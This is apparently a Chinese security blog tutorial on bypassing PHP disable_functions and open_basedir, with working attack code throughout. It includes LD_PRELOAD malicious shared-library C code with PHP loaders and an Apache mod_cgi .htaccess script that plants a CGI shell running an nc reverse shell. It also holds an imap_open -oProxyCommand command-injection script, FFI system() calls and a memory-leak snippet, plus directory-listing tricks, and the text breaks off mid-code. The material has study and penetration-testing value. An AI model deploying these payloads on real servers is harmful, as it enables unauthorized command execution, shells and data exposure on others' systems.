<h3 id="什么是php-fpm"><a href="#什么是php-fpm" class="headerlink" title="什么是php-fpm"></a>什么是php-fpm</h3><p>php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
<p>说到fastcgi,就必须先讲一下cgi</p>
<p>cgi的历史:</p>
<blockquote>
<p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p>
</blockquote>
<p>Fast-CGI:</p>
<p>虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。</p>
<blockquote>
<p>fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
</blockquote>
<p>php-fpm 是一个Fastcgi的实现,并提供进程管理功能。</p>
<p>进程包含了master进程和worker进程</p>
<p>master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。</p>
<p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p>
<p>上面第一个是主进程,下面两个是worker进程。</p>
<h3 id="服务器利用fastcgi的通信过程"><a href="#服务器利用fastcgi的通信过程" class="headerlink" title="服务器利用fastcgi的通信过程"></a>服务器利用fastcgi的通信过程</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
<p>fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>record具有固定的结构。</p>
<pre><code class="c">typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;</code></pre>
<p>而其中的<code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p>
<p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p>
<p>借用<a href="http://blog.csdn.net/shreck66/article/details/50355729" target="_blank" rel="noopener">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p>
<p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p>
<p>根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
<p>我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。</p>
<p>php里有很多有趣的设置,像文件包含里常用的php设置<code>auto_prepared_file,auto_append_file</code></p>
<p>我们令<code>auto_prepared_file=php://input</code>且<code>allow_url_include=On</code></p>
<p>那么我们该如何利用fastcgi来设置php的环境变量</p>
<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
<p>结构体实例:</p>
<pre><code class="php">array(
        &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
        &#39;REQUEST_METHOD&#39; =&gt; &#39;POST&#39;,
        &#39;SCRIPT_FILENAME&#39; =&gt; &#39;/var/www/html/index.php&#39;,
        &#39;SERVER_SOFTWARE&#39; =&gt; &#39;php/fcgiclient&#39;,
        &#39;REMOTE_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,
        &#39;REMOTE_PORT&#39; =&gt; &#39;9985&#39;,
        &#39;SERVER_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,
        &#39;SERVER_PORT&#39; =&gt; &#39;80&#39;,
        &#39;SERVER_NAME&#39; =&gt; &#39;mag-tured&#39;,
        &#39;SERVER_PROTOCOL&#39; =&gt; &#39;HTTP/1.1&#39;,
        &#39;CONTENT_TYPE&#39; =&gt; &#39;application/x-www-form-urlencoded&#39;,
        &#39;CONTENT_LENGTH&#39; =&gt; strlen($content),
        &#39;PHP_VALUE&#39; =&gt;&#39;auto_append_file=php://input&#39;,
        &#39;PHP_ADMIN_VALUE&#39;=&gt;&#39;allow_url_include=On&#39;
    )</code></pre>
<h3 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h3><p>这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell</p>
<h3 id="fpm利用脚本"><a href="#fpm利用脚本" class="headerlink" title="fpm利用脚本"></a>fpm利用脚本</h3><p>分享个p牛脚本里面的一个client客户端: <a href="https://github.com/wuyunfeng/Python-FastCGI-Client" target="_blank" rel="noopener">Python FastCGI Client</a><br>还有Lz1y师傅给的一个php客户端 <a href="https://github.com/adoy/PHP-FastCGI-Client.git" target="_blank" rel="noopener">PHP FastCGI Client</a></p>
<p>还要php语言客户端: <a href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans" target="_blank" rel="noopener">fastcgi客户端PHP语言实现</a></p>
<h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？</p>
<p>google给出如下定义</p>
<pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
<p>而putenv可以设置环境变量</p>
<pre><code class="php">putenv ( string $setting ) : bool</code></pre>
<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>那么我们可以进行一下骚操作</p>
<blockquote>
<p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library</p>
</blockquote>
<h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p><code>putenv,errorlog,mail</code></p>
<h4 id="如何制作shared-libraries"><a href="#如何制作shared-libraries" class="headerlink" title="如何制作shared libraries"></a>如何制作shared libraries</h4><p>选择要替换的函数我们这里选取geteuid()</p>
<p>理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数</p>
<pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() {
    system(&quot;ls &gt; result.txt&quot;);
    }
    int  geteuid() {
    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) 
    { return 0; }
    unsetenv(&quot;LD_PRELOAD&quot;);
    payload();
      }</code></pre>
<p>当这个共享库中的 <code>geteuid</code> 被调用时，尝试加载 <code>payload()</code> 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：</p>
<pre><code>gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so</code></pre><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>将恶意的.so文件上传到服务器</p>
<p>执行如下代码,即可载入恶意命令</p>
<pre><code class="php">&lt;?php
putenv(&quot;LD_PRELOAD=/var/www/hack.so&quot;);
mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;</code></pre>
<h4 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p>[<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a href="https://www.k0rz3n.com/2019/02/12/PHP" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP</a> 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)</p>
<p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
<h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#Method2——劫持启动进程" target="_blank" rel="noopener">参考链接</a> </p>
<blockquote>
<p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p>
<p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p>
</blockquote>
<h4 id="由于open-basedir-web目录不可写绕过"><a href="#由于open-basedir-web目录不可写绕过" class="headerlink" title="由于open_basedir+web目录不可写绕过"></a>由于open_basedir+web目录不可写绕过</h4><p>见 bypass open_basedir 的 tmpfile部分</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p>
<pre><code>#define _GNU_SOURCE

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);

    // unset environment variable LD_PRELOAD.
    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {
                    environ[i][0] = &#39;\0&#39;;
            }
    }

    // executive command
    system(cmdline);
}</code></pre><p>接着用以下语句编译C文件为共享对象文件：</p>
<pre><code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</code></pre><p>bypass_disablefunc.php，代码和test.php一致：</p>
<pre><code class="php">&lt;?php
    $cmd = &quot;ls&quot;;
    $out_path = &quot;/tmp/cmdout&quot;;
    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;
    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);
    $so_path = &quot;/var/www/html/bypass_disablefunc.so&quot;;
    putenv(&quot;LD_PRELOAD=&quot; . $so_path);
    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
    unlink($out_path);
?&gt;</code></pre>
<h2 id="apache-php-cgi-mod攻击"><a href="#apache-php-cgi-mod攻击" class="headerlink" title="apache+php cgi mod攻击"></a>apache+php cgi mod攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能</p>
<pre><code class="html">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</code></pre>
<p>然后再看看攻击代码片段</p>
<pre><code class="php">char poststr[] = &quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot; \ &quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot; \ &quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot; \ &quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot; \ &quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot; \ &quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot; \ &quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot; \ &quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot; \ &quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot; \ &quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot; \ &quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot; \ &quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot; \</code></pre>
<p>解码出来是</p>
<pre><code class="php">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=&quot;&quot; -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</code></pre>
<p>这样Kingcope的攻击代码思路就出来了。</p>
<p>关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、apache+php是用cgi模式跑的，例如apache的mod_cgid</p>
<p>2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置</p>
<pre><code class="html">    /cgi-bin/php
    /cgi-bin/php5
    /cgi-bin/php-cgi
    /cgi-bin/php.cgi
    /cgi-bin/php4</code></pre>
<p>3、php版本<br>PHP版本小于5.3.12<br>PHP版本小于5.4.2</p>
<p>或者</p>
<ol>
<li>mod_cgi已经启用 </li>
<li>必须允许.htaccess文件 , 在httpd.conf中，要注意AllowOverride选项为All </li>
<li>必须有权限写.htaccess文件</li>
</ol>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><pre><code class="php">&lt;?php
$cmd = &quot;nc -c&#39;/bin/bash&#39; 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
$shellfile .=&quot;$cmd&quot;; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
}
if(!isset($_GET[&#39;checked&#39;]))
{
    @file_put_contents(&#39;.htaccess&#39;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
    header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;]. &#39;?checked=true&#39;); //执行环境的检查
}
else
{
    $modcgi = in_array(&#39;mod_cgi&#39;,apache_get_modules()); // 检测mod_cgi是否开启
    $writable = is_writable(&#39;.&#39;); //检测当前目录是否可写
    $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]);//检测是否启用了.htaccess
        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
    {
        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
    }
    else
    {

 checkEnabled(&quot;Backing 
up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess

checkEnabled(&quot;Write 
.htaccessfile&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
        checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
        echo &quot;Executing the script now.Check your listener &lt;img src = &#39;shell.dizzle&#39; style =&#39;display:none;&#39;&gt;&quot;; //调用
    }
}
?&gt;</code></pre>
<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote>
<p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 </p>
</blockquote>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>存在ssh和rsh功能 且  enable_insecure_rsh = true</p>
<h3 id="利用脚本-未测试"><a href="#利用脚本-未测试" class="headerlink" title="利用脚本(未测试)"></a>利用脚本(未测试)</h3><pre><code class="php">if (!function_exists(&#39;imap_open&#39;)) {
        die(&quot;no imap_open function!&quot;);
}
$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;
//$server = &#39;x -oProxyCommand=echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &#39;|base64$IFS$()-d|sh}&#39;;
imap_open(&#39;{&#39; . $server . &#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());
sleep(5);
echo file_get_contents(&quot;/tmp/cmd_result&quot;);</code></pre>
<h2 id="利用pcntl插件绕过"><a href="#利用pcntl插件绕过" class="headerlink" title="利用pcntl插件绕过"></a>利用pcntl插件绕过</h2><pre><code>pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</code></pre><h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>FFI::load 无视 opeb_basedir 可以直接加载文件</p>
<p>FFI 相对于 php 更加底层，可以泄露内存</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="php">$ffi=FFI::cdef(&quot;int system(char *command);&quot;,&quot;libc.so.6&quot;);
$ffi-&gt;system(&quot;sleep 5&quot;);</code></pre>
<h3 id="open-basedir，禁用FFI-cdef，目录无法写文件命令执行"><a href="#open-basedir，禁用FFI-cdef，目录无法写文件命令执行" class="headerlink" title="open_basedir，禁用FFI::cdef，目录无法写文件命令执行"></a>open_basedir，禁用FFI::cdef，目录无法写文件命令执行</h3><pre><code>$value=&lt;&lt;&lt;EOF
#define FFI_SCOPE &quot;DUMMY&quot;
#define FFI_LIB &quot;libc.so.6&quot;

int system(const char *command);
EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas[&#39;uri&#39;];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );


$ffi=FFI::load($tmpFilename);
$ffi-&gt;system(&#39;echo bypass_disable_function &gt; /tmp/testing&#39;);

fclose($tmpHandle);</code></pre><h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);
$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));
$a=FFI::string($b-400000,400000);
var_dump($a);
</code></pre>
<h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p>
<h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p>
<h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><pre><code class="php">if (!extension_loaded(&quot;win32std&quot;)) die(&quot;win32std extension required!&quot;);
system(&quot;cmd.exe&quot;); //just to be sure that protections work well
win_shell_execute(&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;);
</code></pre>
<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="https://www.anquanke.com/post/id/197745#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-5</a> </p>
<p> <a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法" target="_blank" rel="noopener">浅谈几种Bypass-disable-functions的方法</a> </p>
<h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfile绕过open-basedir在-tmp目录写文件"><a href="#tmpfile绕过open-basedir在-tmp目录写文件" class="headerlink" title="tmpfile绕过open_basedir在/tmp目录写文件"></a>tmpfile绕过open_basedir在/tmp目录写文件</h2><pre><code>&lt;?php
$value=&lt;&lt;&lt;EOF

EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas[&#39;uri&#39;];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );



fclose($tmpHandle);</code></pre><h2 id="ini-set与chdir-绕过open-basedir"><a href="#ini-set与chdir-绕过open-basedir" class="headerlink" title="ini_set与chdir 绕过open_basedir"></a>ini_set与chdir 绕过open_basedir</h2><pre><code class="php">mkdir(&#39;img&#39;);
chdir(&#39;img&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
</code></pre>
<h2 id="glob协议列根目录"><a href="#glob协议列根目录" class="headerlink" title="glob协议列根目录"></a>glob协议列根目录</h2><pre><code class="php">$it = new DirectoryIterator(&quot;glob:///*&quot;);
foreach ($it as $f){
    echo $f-&gt;__toString().&quot; &quot;;
}
</code></pre>
<h2 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h2><p>realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了<code>open_basedir</code>的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在<code>open_basedir</code>里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，所以这个时候就可以类似于报错盲注去爆出文件名了<br>这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点</p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;,dirname(__FILE__));
printf(&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexist&#39;);
$dir = &#39;d:/test/&#39;;
$file = &#39;&#39;;
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#39;;
for ($i=0; $i&lt;strlen($chars); $i++){
    $file = $dir.$chars[$i].&#39;&lt;&lt;&#39;;
    realpath($file);
}
function isexist($errno, $errstr){
    $regex = &#39;/File\((.*)\) is not within/&#39;;
    printf(&quot;errstr: %s &lt;br/&gt;&quot;,$errstr);
    preg_match($regex, $errstr, $mathes);
    if (isset($mathes[1])){
        printf(&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;, $mathes[1]);
    }
}</code></pre>
<h2 id="SplFileInfo-getRealPath列目录"><a href="#SplFileInfo-getRealPath列目录" class="headerlink" title="SplFileInfo::getRealPath列目录"></a>SplFileInfo::getRealPath列目录</h2><p> SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的<code>realpath</code>很相似，就是<code>getRealPath</code>，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了<code>open_basedir</code>的设定 </p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));
$basedir = &#39;d:/test/&#39;;
$arr = array();
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;
